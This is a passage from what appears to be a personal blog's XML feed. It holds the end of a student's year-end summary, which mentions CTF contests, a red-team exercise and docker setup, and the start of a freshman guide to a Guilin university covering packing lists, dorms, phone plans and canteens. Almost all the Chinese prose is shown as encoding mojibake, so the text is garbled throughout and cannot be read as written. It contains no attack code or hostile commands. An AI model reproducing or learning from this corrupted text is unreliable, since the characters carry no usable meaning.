id="è¥¿å¤§å¥‡å®‰ä¿¡æ¯"><a href="#è¥¿å¤§å¥‡å®‰ä¿¡æ¯" class="headerlink" title="è¥¿å¤§å¥‡å®‰ä¿¡æ¯"></a>è¥¿å¤§å¥‡å®‰ä¿¡æ¯</h2><p>è¿™å›ä¸æ˜¯å‚èµ›é€‰æ‰‹ï¼Œä½†æ˜¯çœ‹å­¦å¼Ÿä»¬åç‰¢ä¹ŸæŒºéš¾å—çš„ã€‚å»å¹´æ˜¯æ‰“ CTFï¼Œæ²¡æƒ³åˆ°ä»Šå¹´ç›´æ¥å˜æ‰“é¶æœºæ¸—é€ï¼Œæå¾—äºŒè¿›åˆ¶å­¦å¼Ÿç›´æ¥å˜é¥®æ°´æœºç®¡ç†å‘˜ï¼Œæ‰“ web çš„å­¦å¼Ÿä¹Ÿæ²¡æ€ä¹ˆæ‰“è¿‡é¶æœºï¼Œåªèƒ½æ˜¯ç°å­¦ç°å–ã€‚</p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E5%BF%8D%E7%AC%91.jpg"  /><p>ä½†æ˜¯ä¹Ÿä¸å®Œå…¨æ˜¯åäº‹ï¼Œå­¦å¼Ÿä»¬è‡ªé—­å›æ¥å‹¤å¥‹äº†å¥½å¤šï¼Œå¸Œæœ›æ˜å¹´ä¸ç®¡æ˜¯ CTF è¿˜æ˜¯æ‰“é¶æœºéƒ½èƒ½æ‹¿å¥½æˆç»©ã€‚</p><h2 id="æ•™è‚²æŠ¤ç½‘"><a href="#æ•™è‚²æŠ¤ç½‘" class="headerlink" title="æ•™è‚²æŠ¤ç½‘"></a>æ•™è‚²æŠ¤ç½‘</h2><p>å¾ˆå¹¸è¿èƒ½åœ¨è¿›å…¥è€ƒç ”å¤ä¹ å‰è¿˜èƒ½æ‰“ä¸€æ¬¡æŠ¤ç½‘ï¼Œè¿™å›æ‘¸è¿›äº†å†…ç½‘ï¼Œæˆç»©ä¹Ÿæ¯”è¾ƒå¯ä»¥ï¼Œæœ‰ä¸‰ç­‰å¥–å’Œ 1000 å—ï¼Œä¸å¹¸çš„æ˜¯æˆ‘åˆ°çš„ç¬¬äºŒå¤©å°±å¼€å§‹æ„Ÿå†’å‘çƒ§ï¼Œä¸€ä¸ªåŒé˜Ÿå¸ˆå‚…æå‰å›å­¦æ ¡å‡†å¤‡è€ƒè¯•ã€‚</p><p>è¿™å›æ”¶è·å¾ˆå¤šï¼Œé¦–å…ˆæ˜¯æ„Ÿå—åˆ°äº†å¹¿èŒé—¨å£çš„å¤œå¸‚ç”Ÿæ´»ï¼Œåƒåˆ°äº†è¿˜å¯ä»¥çš„çŒªè‚šé¸¡ã€çƒ¤é±¼å’Œç‚’èºã€‚æœ€è®©äººæƒŠè®¶çš„æ˜¯ï¼Œé‚£è¾¹çš„çƒ¤é±¼ä»·æ ¼è¢«åŒè¡Œä»¬å·åˆ° 28 å—ä¸€æ¡ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118041423.png" alt="çŒªè‚šé¸¡"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118041653.png" alt="çƒ¤é±¼"></p><p>å…¶æ¬¡æ˜¯è§‰å¾—è¿™æ¬¡æŠ¤ç½‘çš„æ•´ä½“å®‰æ’ï¼Œä¸ç®¡æ˜¯æ•™è‚²å…è¿˜æ˜¯å¹¿èŒéƒ½éå¸¸çš„é‡è§†ï¼Œä»åœ°é“ç«™å®‰æ’å­¦ç”Ÿå’Œå¤§å·´æ¥é€ï¼Œåˆ°å®‰æ’åè®®é…’åº—ã€åˆ°æ ¡å†…åœºåœ°å¸ƒç½®ã€å¼€å¹•å¼ã€ä»¥åŠé…å‘çš„æ¸—é€å¤§ç¤¼åŒ…ï¼Œéƒ½èƒ½çœ‹å‡ºæ˜¯æœ‰å‡†å¤‡å’Œè®¾è®¡è¿‡çš„ï¼Œå¸Œæœ›ä»¥åè¶ŠåŠè¶Šå¥½ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118042154.png" alt="æ¬¢è¿å…¥ä½"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118042259.png" alt="å¼€å¹•å¼"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118042327.png" alt="æ¸—é€å¤§ç¤¼åŒ…"></p><h2 id="ç¬¬äºŒå±Šæ¢¦æå…‰æ¯ï¼ˆæ ¡èµ›ï¼‰"><a href="#ç¬¬äºŒå±Šæ¢¦æå…‰æ¯ï¼ˆæ ¡èµ›ï¼‰" class="headerlink" title="ç¬¬äºŒå±Šæ¢¦æå…‰æ¯ï¼ˆæ ¡èµ›ï¼‰"></a>ç¬¬äºŒå±Šæ¢¦æå…‰æ¯ï¼ˆæ ¡èµ›ï¼‰</h2><p>åŒæ ·ï¼Œè¿™æ¬¡ä¹Ÿä¸æ˜¯å‚èµ›é€‰æ‰‹ï¼Œè€Œæ˜¯è´Ÿè´£æ•´ä¸ªæ¯”èµ›çš„ç¯å¢ƒæ­å»ºã€è¿ç»´å’Œå…¶ä»–æ‚æ´»ã€‚åŠ¨æ‰‹å®æ“ä¸­å­¦åˆ°äº†ä¸€äº› docker çŸ¥è¯†ï¼Œå› ä¸ºå®³æ€•æŠŠæ­£å¼ç”¨çš„æœåŠ¡å™¨æ­ç¯å¢ƒæ­ä¹±æ‰ï¼Œç”¨è‡ªå·±çš„å­¦ç”Ÿæœºå’Œè™šæ‹Ÿæœºæ­è¿‡äº†æ‰æ•¢å¾€ä¸Šå®æ“ï¼Œçº¯çº¯èœé¸Ÿã€‚æ˜å¹´æƒ³å‡ºé¢˜è¯•è¯•ï¼Œæ”’äº†ä¸€ç‚¹æŠ˜ç£¨å­¦å¼Ÿçš„å¥½æƒ³æ³•ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/A60403BIEB8QRHXP%60NLRHQX.png"></p><p>åä¼šé‡Œçš„å­¦å¼Ÿä»¬æŒºäº‰æ°”ï¼Œæ‹¿äº†çº¿ä¸Šçº¿ä¸‹åŒç¬¬ä¸€ï¼Œèµ›åä¹ŸåŠæ—¶å¤ç›˜æ²¡æœ‰åšå‡ºæ¥çš„é¢˜ç›®ï¼Œå¥½äº‹ï¼Œå¯ä»¥æ”¾å¿ƒæ»šå»è€ƒç ”äº†ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20220118043336.png" alt="çŸ«æƒ…çš„è¯´è¯´"></p><blockquote><p>2022.1.15 æ›´æ–°</p><p>ç»“æŸï¼Œå‡†å¤‡ç¿»ä¸Šå»å†™ 2022 çš„ç›®æ ‡å§</p></blockquote><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E8%B5%B0%E4%BA%86.jpg" alt="" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> å¹´ç»ˆæ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¹´ç»ˆæ€»ç»“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–°ç”Ÿå…¥å­¦æ”»ç•¥1.0</title>
      <link href="/posts/59594/"/>
      <url>/posts/59594/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢</p><p>è¿™ç¯‡æ–‡ç« å¢åˆ æ”¹æŸ¥è‡ªæˆ‘ä¸çŸ¥é“ä»å“ªä¸ªæ–°ç”Ÿç¾¤é‡Œä¸‹è½½çš„ä¸€ä¸ªåä¸ºâ€œçœ‹å®Œå†é—®æˆ‘å°±è‡ªæ€å…¥å­¦è¶…çº§å®Œæ•´æ”»ç•¥â€çš„æ–‡æ¡£ï¼Œè‹¥ä¾µåˆ </p><p>21 çº§æ–°ç”Ÿéƒ½é™†é™†ç»­ç»­åŠ å…¥åˆ°æ–°ç”Ÿç¾¤é‡Œï¼Œå¸¸è§çš„é—®é¢˜å°±æ˜¯å¤§å®¶çš„æé—®å†—ä½™ï¼Œå¯èƒ½å­¦é•¿å­¦å§ä»¬ä¼šè¢«é—®åˆ°ç›¸åŒçš„é—®é¢˜å¥½å‡ æ¬¡ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä»¥åŠç»™æ–°ç”Ÿæœ€å¥½çš„<del>æ¸¸æˆä½“éªŒ</del>å…¥å­¦ä½“éªŒï¼Œå†™ä¸€ç¯‡åšå®¢ä¾›æ–°ç”Ÿå‚è€ƒ</p><p>å¦‚æœä½ æ˜¯æˆ‘ä»¬å­¦æ ¡çš„å­¦é•¿å­¦å§ \ è€å¸ˆ  \ è¾…å¯¼å‘˜ï¼Œçœ‹åˆ°äº†åšå®¢æ–‡ç« æœ‰ä»€ä¹ˆæ„è§ã€å»ºè®®æƒ³æå‡ºï¼Œå¯ä»¥è”ç³»æˆ‘</p><blockquote><p>Q : 1160118161</p></blockquote></blockquote><h1 id="ç‰©å“ç¯‡"><a href="#ç‰©å“ç¯‡" class="headerlink" title="ç‰©å“ç¯‡"></a>ç‰©å“ç¯‡</h1><h2 id="å¿…å¸¦ç‰©å“"><a href="#å¿…å¸¦ç‰©å“" class="headerlink" title="å¿…å¸¦ç‰©å“"></a>å¿…å¸¦ç‰©å“</h2><ul><li>äºº</li><li>èº«ä»½è¯</li><li>å½•å–é€šçŸ¥ä¹¦ã€å‡†è€ƒè¯</li><li>ç”Ÿæºåœ°è´·æ¬¾å›æ‰§å•</li><li>é“¶è¡Œå¡ï¼ˆä»¥åçš„è¡¥åŠ©ã€å¥–é‡‘éƒ½ä¼šå‘åˆ°å­¦æ ¡å‘çš„é‚£å¼ é“¶è¡Œå¡ä¸Šï¼‰</li><li>è¯ä»¶ç…§å®ä½“ç‰ˆå’Œç”µå­ç‰ˆï¼Œå®ä½“ç‰ˆæœ€å¥½æ˜¯ä¸€å¯¸ä¸¤å¯¸çš„éƒ½æœ‰ï¼Œå„å¸¦ä¸€ç»„ï¼Œç”µå­ç‰ˆä¹Ÿè¦ä¿å­˜å¥½ï¼Œä»¥åè‚¯å®šæœ‰ç”¨</li><li>é«˜ä¸­æ¡£æ¡ˆè¢‹ï¼ˆå¯†å°æœªæ‹†ï¼‰ã€å›¢ï¼ˆå…šï¼‰å‘˜æ¡£æ¡ˆï¼ˆåŒ…æ‹¬å›¢ç»„ç»‡ä»‹ç»ä¿¡è½¬æ¥ä¿¡ç­‰ç­‰ææ–™ï¼‰</li><li>è£…å¥½è¡Œæçš„è¡Œæç®±</li><li>ç°é‡‘ä¸€ä¸¤ç™¾ï¼Œé›¶é’±ä¸€äºŒå</li><li>ç”·ç”Ÿè¦å¸¦å…µå½¹ç™»è®°è¯æ˜ï¼ˆæ ¹æ®å®é™…æƒ…å†µæºå¸¦ï¼Œæœ‰å…µå½¹ç™»è®°è¯çš„å¸¦è¯ï¼Œæ²¡æœ‰çš„ä¸Šå¤§å­¦ç”Ÿå¾å…µç½‘å¯¼å‡ºç›¸å…³çš„è¯æ˜å»å½“åœ°æ‰€åœ¨æ­¦è£…éƒ¨ç›–ç« åå¸¦æ¥ï¼‰</li><li>æˆ·å£æœ¬é¦–é¡µä»¥åŠæœ¬äººé¡µå¤å°ä»¶è‹¥å¹²å¼ å¤‡ç”¨</li><li>åºŠä¸Š n ä»¶å¥—ï¼ˆæ–¹ä¾¿å°±å¸¦ï¼Œä¸æ–¹ä¾¿å»ºè®®ç½‘è´­æˆ–ä»å®¶é‡Œå¯„è¿‡æ¥å­¦æ ¡ï¼Œä¸å»ºè®®åœ¨å­¦æ ¡é‡Œé¢ä¹°ï¼Œå®¹æ˜“è¢«æ¨é”€çš„å­¦é•¿å­¦å§ç¼ ä¸Šè€Œä¸”è´¨é‡ä¸äºˆè¯„ä»·ï¼‰</li><li>æ‰‹æœºã€å¹³æ¿ã€å……ç”µå®ã€æ•°æ®çº¿ã€è€³æœºã€U ç›˜</li><li>ä½ ä¸èƒ½å¤Ÿç•™åœ¨å®¶é‡Œé¢çš„ç§˜å¯†</li></ul><h2 id="ç”Ÿæ´»ç”¨å“"><a href="#ç”Ÿæ´»ç”¨å“" class="headerlink" title="ç”Ÿæ´»ç”¨å“"></a>ç”Ÿæ´»ç”¨å“</h2><blockquote><p>åœ¨æŠ¥åˆ°ç»“æŸåï¼Œä¼šæœ‰å¿—æ„¿è€…å­¦é•¿å­¦å§åˆ°ä½ ä»¬çš„å®¿èˆï¼Œæ”¶æ‹¾å¥½è‡ªå·±çš„è¡Œæä¹‹åï¼Œå¯ä»¥å»ä¹°ç”Ÿæ´»ç”¨å“ï¼Œåˆ—ä¸ªæ¸…å•åˆ°æ—¶å€™ä½ ä»¬çœ‹è‡ªå·±æƒ…å†µå»ä¹°</p><p>å»ºè®®åˆ°æ ¡å¤§å®¶è‡ªå·±è‡ªå¤‡æˆ–è€…å®¿èˆå¤‡ä¸€ä¸ªåŒ»è¯ç®±ï¼Œå› ä¸ºå¤§åŠå¤œç”Ÿç—…æ ¡åŒ»åŸºæœ¬ä¸Šæ˜¯æ²¡ä»€ä¹ˆäººçš„ï¼Œåœ¨å¤§å­¦é‡Œé¢ä¸€å®šè¦è‡ªå·±ç…§é¡¾å¥½è‡ªå·±ï¼Œç‰¹åˆ«æ˜¯å¦‚æœä½ åœ¨è¿œæ–¹æœ‰ä¸€ä¸ªç‰µæŒ‚ç€ä½ çš„äººï¼Œä¸€ä¸ªä¼˜ç§€çš„åŒ»è¯ç®±èƒ½å¤Ÿè®©ä»–&#x2F;å¥¹å®‰å¿ƒå¾ˆå¤š</p><p>é€€çƒ§è¯ã€æ„Ÿå†’è¯ã€æ¶ˆç‚è¯ã€è‚ èƒƒè¯ã€é£æ²¹ç²¾ã€è—¿é¦™æ­£æ°”æ°´ï¼ˆé˜²ä¸­æš‘ï¼‰ã€åˆ›å¯è´´å’Œä½“æ¸©è®¡ã€å…¶ä»–è¯å“å› äººè€Œå¼‚</p></blockquote><ul><li>å¸­å­</li><li>æ¡¶ã€ç›†</li><li>èšŠå¸ã€çª—å¸˜</li><li>æ’æ’ï¼ˆä¹°å¥½ç‚¹çš„ï¼Œå®‰å…¨ï¼‰</li><li>æ´—å‘æ°´ã€æ²æµ´éœ²ã€æ´—é¢å¥¶ã€è‚¥çš‚ã€æ´—è¡£æ¶²&#x2F;æ´—è¡£ç²‰</li><li>èŠ±éœ²æ°´</li><li>æŒ‚é’©</li><li>å¤¹å­ã€è¡£æ¶</li><li>ç‰™åˆ·ã€ç‰™è†ã€æ¼±å£æ¯</li><li>æ´—è„¸æ¯›å·¾ã€æ´—æ¾¡æ¯›å·¾</li><li>æŠ½çº¸ã€å·ç­’çº¸ï¼ˆå®¿èˆå½“çˆ¹ç¬¬ä¸€æ­¥ï¼‰</li><li>ç”·ç”Ÿå¸¦å‰ƒé¡»åˆ€ã€å¥³ç”Ÿå¸¦è‡ªå·±çš„åŒ–å¦†åŒ…ã€å¤´ç»³ç­‰ç­‰è®©è‡ªå·±å˜ç¾çš„ä¸œè¥¿</li><li>å¹é£æœº</li><li>æ¢³å­ï¼ˆå»ºè®®è‡ªå¸¦ï¼‰</li><li>ä¸€æŠŠé›¨ä¼ä¸€æŠŠå¤ªé˜³ä¼ï¼ˆé‡ç‚¹å¼ºè°ƒï¼Œæ¡‚æ—æ˜¥å¤©é›¨å­£éå¸¸ä¹…ï¼Œå¤å¤©å¾ˆæ™’å¾ˆæ™’ï¼‰</li><li>å‡ æŠŠå°é”ï¼Œç”¨æ¥é”ç®±å­æŠ½å±‰ç­‰ç§äººå‚¨ç‰©ç©ºé—´</li><li>æŒ‡ç”²é’³</li><li>æ‹–é‹</li><li>æŠ¹å¸ƒ</li><li>å¥³ç”Ÿæ‡‚é’ˆçº¿æ´»çš„å¯ä»¥ä¹°ä¸ªé’ˆçº¿åŒ…</li><li>æ°´æ¯ï¼ˆæœ€å¥½æ˜¯å¡‘æ–™çš„ï¼‰</li><li>å°å°ç¯&#x2F;å°å¤œç¯</li><li>æ¨Ÿè„‘ä¸¸ã€å¹²ç‡¥å‰‚ï¼ˆæ”¾æŠ½å±‰æ”¾æŸœå­é‡Œï¼‰</li><li>å…¶ä»–å®¿èˆç¥å™¨å»çŸ¥ä¹é‡Œçœ‹çœ‹å†å»æ·˜å®æˆ–è€… pdd  ä¹°ï¼ŒæŒ‰éœ€è´­ä¹°å³å¯</li></ul><h1 id="ç”Ÿæ´»ç¯‡"><a href="#ç”Ÿæ´»ç¯‡" class="headerlink" title="ç”Ÿæ´»ç¯‡"></a>ç”Ÿæ´»ç¯‡</h1><h2 id="å­¦æ ¡åœ°å›¾"><a href="#å­¦æ ¡åœ°å›¾" class="headerlink" title="å­¦æ ¡åœ°å›¾"></a>å­¦æ ¡åœ°å›¾</h2><p><a href="https://www.guet.edu.cn/xxjj/hjxqpmdt.htm">åœ°å›¾å®˜ç½‘åœ°å€</a></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E5%AD%A6%E6%A0%A1%E5%9C%B0%E5%9B%BE.png" alt="å­¦æ ¡åœ°å›¾"></p><h2 id="å†›è®­"><a href="#å†›è®­" class="headerlink" title="å†›è®­"></a>å†›è®­</h2><p>8 æœˆ 23 æ—¥å†›è®­ï¼Œå†›è®­ 14 å¤©ï¼Œå†›è®­è¦å¸¦é˜²æ™’éœœï¼Œå’Œå†›è®­é‹å«ã€‚é˜²æ™’éœœä¸æ˜¯ä¸ºäº†é˜²æ­¢ä½ æ™’é»‘ï¼Œæ˜¯é˜²æ­¢ä½ æ™’ä¼¤ï¼Œå†›è®­é‹å«å¯ä»¥å‡å°‘ä½ æ™•å€’çš„é£é™©ï¼Œä¸è¦ç¡¬é¡¶ï¼Œä¹Ÿä¸è¦é¡¶æ•™å®˜</p><p>æœ‰æ™šè®­ï¼Œæ™šä¸Šä¸€èˆ¬æ˜¯å”±æ­Œ</p><p>ä¼šå‘å†›è®­æœï¼Œä¸€åŒé‹ã€ä¸€ä»¶é€Ÿå¹²è¿·å½©çŸ­è¢–ã€ä¸€ä»¶é•¿è¢–å¤–è¡£ã€ä¸€æ¡è…°å¸¦ã€ä¸€ä¸ªå¸½å­ï¼Œä¸å’Œå°ºç åŠæ—¶æ¢ï¼Œå¦‚æœæ¢ä¸äº†å¯ä»¥å»<strong>å•†ä¸šè¡—äºŒæ¥¼è£ç¼åº—æ”¹å°ºå¯¸</strong></p><p>æ™šä¸Šå›å»é©¬ä¸Šæ´—çŸ­è¢–ï¼Œç¬¬äºŒå¤©è‚¯å®šèƒ½å¹²ï¼Œåˆ«é—®è¿™ä¸ªé—®é¢˜äº†ï¼Œå¦‚æœçœŸçš„ä¸‹é›¨æ•™å®˜ä¹Ÿä¸ä¼šä¸ºéš¾ä½ ä¸€å®šè¦ä½ ç©¿å†›è®­æœ</p><p>ä¸‹é›¨ä¹Ÿç®—ä¸€å¤©ï¼Œä½†æ˜¯åŸºæœ¬ä¸Šä¸ä¼šä¸‹é›¨ï¼Œæ ¹æ®æˆ‘åœ¨æ¡‚æ—ç”Ÿæ´» 20 å¹´çš„ç»éªŒ</p><h2 id="å®¿èˆ"><a href="#å®¿èˆ" class="headerlink" title="å®¿èˆ"></a>å®¿èˆ</h2><ul><li><p>å®¿èˆåˆ†ä¸º A B C D F åŒºï¼Œæ‰€æœ‰å®¿èˆéƒ½æœ‰ç©ºè°ƒ</p></li><li><p>Cã€Fã€ï¼ˆDï¼‰åŒºéƒ½æ˜¯æŒ‡çº¹é”ï¼Œå¯ä»¥ç”¨æŒ‡çº¹å¼€é—¨ï¼Œè¿˜å¯ä»¥ç”¨ä¸€å¡é€šåˆ·å¡å¼€é—¨ï¼Œæ‰‹æœºæœ‰ <strong>nfc</strong> ä¹Ÿå¯ä»¥å¯¼å…¥æ•°æ®åˆ·æ‰‹æœºå¼€é—¨</p></li><li><p>æ–­ç”µå®‰æ’æ˜¯å‘¨æ—¥åˆ°å‘¨å››æ˜¯æ™šä¸Š <strong>23:15</strong> æ–­ç”µï¼Œå‘¨äº”å‘¨å…­ <strong>24:00</strong> æ–­ç”µï¼Œæ—©ä¸Š <strong>6:00</strong> é€šç”µï¼Œ&#x3D;&#x3D;å…¶ä¸­ç©ºè°ƒè·Ÿå•æ‰€ç¯å•ç‹¬ä¾›ç”µ&#x3D;&#x3D;ï¼Œå›¾ä¹¦é¦†ä¸é€šå®µå¼€æ”¾ï¼Œä½†æ˜¯æœ‰é€šå®µçš„è‡ªä¹ å®¤ï¼Œ<strong>ä¸€ä¸ªå­¦æœŸæ™šå½’ä¸‰æ¬¡ä¼šè¢«è®°è¿‡</strong></p></li><li><p>å®¿èˆæœ‰ 4 &#x2F; 6 &#x2F; 8 äººé—´å¤šæ•°ä¸º 6 äººé—´</p></li><li><p>F åŒºæ˜¯æ–°å®¿èˆæ¯ä¸ªå®¿èˆéƒ½æœ‰å•ç‹¬çš„æ´—è¡£æœºï¼ŒB åŒºæŸäº›å®¿èˆä¹Ÿæ˜¯å•ç‹¬æ´—è¡£æœºï¼Œæ™®éçš„æ˜¯ä¸€ä¸ªæ¥¼å±‚ä¿©æ´—è¡£æœºï¼Œä¸€æ¥¼æœ‰æ´—è¡£æˆ¿ï¼Œè¿˜æœ‰çƒ˜å¹²æœºå’Œæ´—é‹æœº</p></li><li><p>åºŠé“ºä¸º <strong>0.9 * 2</strong> ç±³</p></li><li><p>æœ‰ 5G ç½‘ç»œï¼Œå¯ä»¥è‡ªå·±åŠå®½å¸¦ï¼Œè§ç”µè¯å¡é€‰æ‹©</p></li></ul><h2 id="ç”µè¯å¡é€‰æ‹©"><a href="#ç”µè¯å¡é€‰æ‹©" class="headerlink" title="ç”µè¯å¡é€‰æ‹©"></a>ç”µè¯å¡é€‰æ‹©</h2><p>å»ºè®®å¤§å®¶éƒ½åŠä¸€å¼ æ ¡å›­å¡ï¼Œç¬¬ä¸€æ˜¯å› ä¸ºæµé‡æ¯”è¾ƒå¤Ÿç”¨ï¼Œç¬¬äºŒæ˜¯ä½ åœ¨å¤§å­¦è¿™è¾¹éœ€è¦å¡«ç”µè¯å·ç çš„åœ°æ–¹å¯ä»¥å¡«è¿™ä¸€å¼ æ ¡å›­å¡çš„ç”µè¯å·ç ï¼Œä¿¡æ¯æ³„éœ²çš„è¯ä¸ä¼šç‰µæ‰¯åˆ°ä½ å®¶é‚£è¾¹çš„å¡ï¼Œå¤§å­¦æ¯•ä¸šç›´æ¥è§£ç»‘ï¼Œç¬¬ä¸‰æ˜¯åŠæ ¡å›­å¡å¯ä»¥é€å®½å¸¦</p><p>å…³äºå®½å¸¦å’Œä¸‰å¤§å‚å•†é€‰æ‹©é—®é¢˜ï¼Œ2021.07.30 çœ‹åˆ°æ¶ˆæ¯ï¼Œå¦‚æœåç»­æ²¡æœ‰è¾¾æˆæ–°çš„åè®®ï¼Œåˆéœ€è¦ç”¨å®½å¸¦çš„è¯ï¼Œè¿˜æ˜¯å»ºè®®è”é€šï¼Œå¦‚æœæ²¡æœ‰å®½å¸¦çš„éœ€æ±‚ï¼Œéšæ„é€‰æ‹©</p><p>ä¸‰ä¸ªå‚å•†åœ¨å­¦æ ¡çš„ç½‘ç»œæƒ…å†µå¤§å®¶éƒ½æ˜¯ä¼—è¯´çº·çº­ï¼Œæœ¬äººç”¨çš„ç§»åŠ¨å¡åœ¨åŠå…¬å®¤å¯ä»¥ 4g+ï¼Œç”µä¿¡å¡åœ¨åŠå…¬å®¤å°±åªæœ‰ 3gï¼Œä½†æ˜¯åœ¨å®¿èˆç”µä¿¡å¡è¡¨ç°è‰¯å¥½ï¼Œç§»åŠ¨å¡å°±åˆå¾ˆåƒåœ¾</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%60%5B6W4EEQM0%5DRGBF5WLWJK0S.png" alt="å­¦æ ¡å…³äºå®½å¸¦é€šçŸ¥"></p><h2 id="æ€ä¹ˆå¹²é¥­"><a href="#æ€ä¹ˆå¹²é¥­" class="headerlink" title="æ€ä¹ˆå¹²é¥­"></a>æ€ä¹ˆå¹²é¥­</h2><h3 id="é£Ÿå ‚"><a href="#é£Ÿå ‚" class="headerlink" title="é£Ÿå ‚"></a>é£Ÿå ‚</h3><blockquote><p>å†™åœ¨å‰é¢ï¼Œä¸è®¨è®ºé£Ÿå ‚çš„å‘³é“ï¼Œæˆ‘æœ¬äººå¯¹å­¦æ ¡çš„é£Ÿå ‚çš„å®šä½å°±æ˜¯èƒ½åƒå°±è¡Œï¼ŒåŠ ä¸Šå„åœ°æ¥çš„å­¦ç”Ÿéƒ½æœ‰ï¼Œå£å‘³å„ä¸ç›¸åŒï¼Œæ‰€ä»¥å¤§å®¶åˆ°æ ¡ä»¥åè‡ªå·±æ„Ÿå—ï¼Œè¿˜æ˜¯å¾ˆæ¨èé£Ÿå ‚çš„ï¼Œæ¯•ç«Ÿæœ‰ä¿éšœä¸”ç›¸å¯¹ä¾¿å®œ</p><blockquote><p>é”™å³°åƒé¥­æ±‚æ±‚å­¦å¼Ÿå­¦å¦¹ä»¬äº†</p></blockquote></blockquote><p>å…¨æ ¡ä¸€å…±äº”ä¸ªé¤å…ï¼Œåˆ†åˆ«æ˜¯ï¼š<strong>æ€¡å›­é¤å…</strong>ã€<strong>ä»²å›­é¤å…</strong>ã€<strong>é¦¨å›­é¤å…</strong>ã€<strong>æ•™å·¥é¤å… * 2</strong>ï¼Œå…¶ä¸­ Bã€Cã€F ä¸‰ä¸ªåŒºçš„å®¿èˆé—¨å£éƒ½æœ‰å–é¥­çš„é¤ç‚¹ï¼Œæ˜¯æ¯å¤©é£Ÿå ‚åšå¥½äº†è¿åˆ°å®¿èˆé—¨å£æ¥å–ï¼Œè§£å†³æ‹¥å µé—®é¢˜</p><p><strong>æ€¡å›­é¤å…</strong>ï¼šä½äºç”°å¾„åœºæ—è¾¹ï¼Œè·ç¦» Aã€Bã€C åŒºæœ€è¿‘ï¼Œå…±ä¸‰å±‚</p><p>ä¸€æ¥¼æ˜¯å·§é¢é¦†å’Œä¸€é¤å…ï¼Œå·§é¢é¦†ä¸»æ‰“é¢é£Ÿï¼Œæ—©ç‚¹é¤åŒ…ï¼Œä¸€é¤å…æœ‰ä¸€å®¶æ˜æ¡‚ç±³ç²‰ï¼Œå…¶ä½™ä¸»è¦æ˜¯ä¸­é¤æ™šé¤</p><p>äºŒæ¥¼æ˜¯ä¸‰é¤å…å’Œäº”é¤å…è¿˜æœ‰å…¶ä¸­ä¸€ä¸ªæ•™å·¥é¤å…ï¼Œéƒ½æ˜¯ä¸»æ‰“ä¸­é¤å’Œæ™šé¤ï¼Œä¸‰é¤å…ä»·æ ¼å¾ˆä¾¿å®œ æœ´ç´ é£ï¼Œäº”é¤å…è£…ä¿®å¾ˆæ–°ï¼Œä¸­å¤®ç©ºè°ƒå¾ˆå‡‰å¿«ï¼Œä»·æ ¼ä¹Ÿé€‚ä¸­ï¼Œæ•™å·¥é¤å…æ¯å¤©åˆ°ç‚¹å‘å­¦ç”Ÿå¼€æ”¾ï¼Œå› ä¸ºè€å¸ˆæœ‰é¤è¡¥ï¼Œæ‰€ä»¥ä»·æ ¼å¯¹äºå­¦ç”Ÿæ¥è¯´åå°è´µ</p><p>ä¸‰æ¥¼æ˜¯é˜³å…‰å°é•‡ï¼Œéƒ½æ˜¯æ‹›æ ‡æ¥çš„å–å„ç§åƒçš„çš„å•†å®¶ï¼Œæœ‰ä¸€ä¸ªå¤§å±å¹•åƒé¥­çš„æ—¶å€™å¯ä»¥çœ‹ï¼Œç”µç«ç¤¾ä¼šåœ¨ lol ä¸–ç•Œèµ›çš„æ—¶å€™åŒ…ä¸‹è¿™ä¸ªå±å¹•æ¥çœ‹æ€»å†³èµ›</p><p><strong>ä»²å›­é¤å…</strong>ï¼šä½äºè¶³çƒåœºå’Œç¯®çƒåœºæ—è¾¹ï¼Œè·ç¦» Dã€F åŒºæœ€è¿‘ï¼Œå…±ä¸¤å±‚</p><p>ä¸€æ¥¼æ˜¯æ™®é€šçš„é¤å…ï¼Œä»€ä¹ˆéƒ½å–ï¼Œæ—©ä¸­æ™š</p><p>äºŒæ¥¼æ˜¯å•†å®¶å…¥é©»ï¼Œä»€ä¹ˆéƒ½æœ‰ï¼Œç”šè‡³æœ‰æ— éª¨çƒ¤é±¼é¥­</p><p><strong>é¦¨å›­é¤å…</strong>ï¼šä½äºç”°å¾„åœºæ—è¾¹ï¼Œè·ç¦»Aã€Bã€C åŒºæœ€è¿‘ï¼Œä¸€å…±ä¸€å±‚ï¼Œæ—©ä¸­æ™šéƒ½æœ‰å–ï¼Œå› ä¸ºæ˜¯æ‹›æ ‡æ¥çš„é£Ÿå ‚ï¼Œä»·æ ¼æ¯”æ€¡å›­è´µä¸€ç‚¹</p><p><strong>å•†ä¸šè¡—æ•™å·¥é¤å…</strong>ï¼šæœ‰å¤§æ’æ¡£é‡Œé¢é‚£ç§æ‹¿ä¸ªå°é”…ç‚¹é…’ç²¾ç¯æ¶èµ·æ¥åƒçš„å°å¹²é”…ï¼Œä¹Ÿå¯¹å­¦ç”Ÿå¼€æ”¾ï¼Œå…¶ä»–çš„æ—©ä¸­æ™šéƒ½æœ‰å–</p><h3 id="åè¡—"><a href="#åè¡—" class="headerlink" title="åè¡—"></a>åè¡—</h3><blockquote><p>å†™åœ¨å‰é¢ï¼Œä¸è¿‡å¤šè®¨è®ºåè¡—çš„ä¸œè¥¿ï¼Œæ¯•ç«Ÿå­¦æ 